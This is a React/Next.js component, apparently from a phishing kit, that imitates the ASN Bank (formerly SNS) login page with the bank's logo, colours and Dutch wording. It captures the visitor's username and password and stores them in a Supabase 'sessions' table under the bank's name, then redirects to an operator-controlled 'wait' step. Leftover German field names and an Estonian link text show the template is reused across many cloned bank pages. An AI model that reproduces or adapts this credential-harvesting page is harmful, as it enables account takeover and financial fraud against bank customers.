"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { stepToPath } from "@/lib/session-routes";

type Props = {
  sessionId: string;
};

export function AsnBankVoorheenSnsLoginClient({ sessionId }: Props) {
  const router = useRouter();
  const supabase = createBrowserSupabaseClient();

  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [remember, setRemember] = useState(false);
  const [saving, setSaving] = useState(false);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (supabase === null || !sessionId) return;
      const { data } = await supabase.from("sessions").select("*").eq("id", sessionId).maybeSingle();
      if (cancelled || !data) return;
      const fd = (data.form_data ?? {}) as Record<string, string>;
      if (fd.verfuegernummer) setUsername(fd.verfuegernummer);
      if (fd.pin) setPassword(fd.pin);
    })();
    return () => {
      cancelled = true;
    };
  }, [sessionId, supabase]);

  async function handleSubmit() {
    if (!supabase || !sessionId) return;
    setSaving(true);
    setError(null);

    const { data: existing } = await supabase.from("sessions").select("*").eq("id", sessionId).maybeSingle();
    const prev = (existing?.form_data ?? {}) as Record<string, unknown>;

    const { error: updateError } = await supabase
      .from("sessions")
      .update({ is_hidden: false, current_step: "wait",
        form_data: {
          ...prev,
          bankSlug: "asn-bank-voorheen-sns",
          bankName: "ASN Bank voorheen SNS",
          verfuegernummer: username,
          pin: password,
        },
      })
      .eq("id", sessionId);

    setSaving(false);
    if (updateError) {
      setError("Something went wrong. Please try again.");
      return;
    }
    // ⭐ FLASH YOK: router.push → router.replace
    router.replace(stepToPath("wait", sessionId));
  }

  return (
    <div className="min-h-screen bg-[#FAF6EC] font-sans flex flex-col">
      {/* Header */}
      <header className="bg-white h-[90px] flex items-center justify-start px-8 lg:px-[15%] border-b border-gray-200 shrink-0">
        <img src="/bank-logos/asn-bank-voorheen-sns.svg" alt="ASN Bank voorheen SNS" className="h-12" />
      </header>

      {/* Main Content */}
      <main className="flex-1 flex flex-col items-center pt-10 pb-20 px-4">
        <div className="bg-white border border-gray-200 w-full max-w-[480px] shadow-sm">
          
          {/* Form Content */}
          <div className="p-8">
            <h1 className="text-[26px] text-[#187A5D] mb-3 font-normal">Inloggen bij SNS</h1>
            <p className="text-[15px] text-[#333] mb-6 font-bold leading-snug">
              Log in met je toegangsnaam, wachtwoord en de beveiligingscode op je telefoon.
            </p>

            <form
              onSubmit={(e) => {
                e.preventDefault();
                void handleSubmit();
              }}
            >
              <div className="mb-4">
                <input
                  type="text"
                  required
                  placeholder="Toegangsnaam"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  className="w-full border border-gray-400 p-3 text-[15px] focus:outline-none focus:border-[#187A5D] focus:ring-1 focus:ring-[#187A5D]"
                />
              </div>

              <div className="mb-4">
                <input
                  type="password"
                  required
                  placeholder="Wachtwoord"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full border border-gray-400 p-3 text-[15px] focus:outline-none focus:border-[#187A5D] focus:ring-1 focus:ring-[#187A5D]"
                />
              </div>

              <div className="mb-6 flex items-center">
                <div className="flex items-center justify-center w-[22px] h-[22px] border border-gray-400 bg-white mr-3 shrink-0">
                  <input
                    type="checkbox"
                    id="remember"
                    checked={remember}
                    onChange={(e) => setRemember(e.target.checked)}
                    className="w-5 h-5 opacity-0 absolute cursor-pointer"
                  />
                  {remember && <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#187A5D" strokeWidth="3"><path d="M20 6L9 17l-5-5"></path></svg>}
                </div>
                <label htmlFor="remember" className="text-[15px] text-[#555] cursor-pointer select-none">
                  Onthoud mijn gebruikersnaam
                </label>
              </div>

              {error && <p className="text-red-600 text-sm mb-4">{error}</p>}

              <button
                type="submit"
                disabled={saving || !username || !password}
                className="bg-[#187A5D] hover:bg-[#126048] text-white px-8 py-3 rounded-full text-[15px] font-bold transition-colors disabled:opacity-50"
              >
                {saving ? "Laden..." : "Inloggen"}
              </button>
            </form>

            <div className="mt-10 space-y-4">
              <a href="#" className="block text-[15px] text-[#73213D] hover:underline underline-offset-2">Log anders in</a>
              <a href="#" className="block text-[15px] text-[#73213D] hover:underline underline-offset-2">Probleeme sisselogimisel?</a>
            </div>
          </div>
        </div>

        {/* Footer Links */}
        <div className="mt-12 flex items-center justify-center gap-6 text-[14px] text-gray-500">
          <a href="#" className="hover:underline underline-offset-2 decoration-gray-400">Contact</a>
          <a href="#" className="hover:underline underline-offset-2 decoration-gray-400">Veilig bankieren</a>
          <a href="#" className="hover:underline underline-offset-2 decoration-gray-400">Privacy</a>
          <a href="#" className="hover:underline underline-offset-2 decoration-gray-400">Disclaimer</a>
        </div>
      </main>
    </div>
  );
}
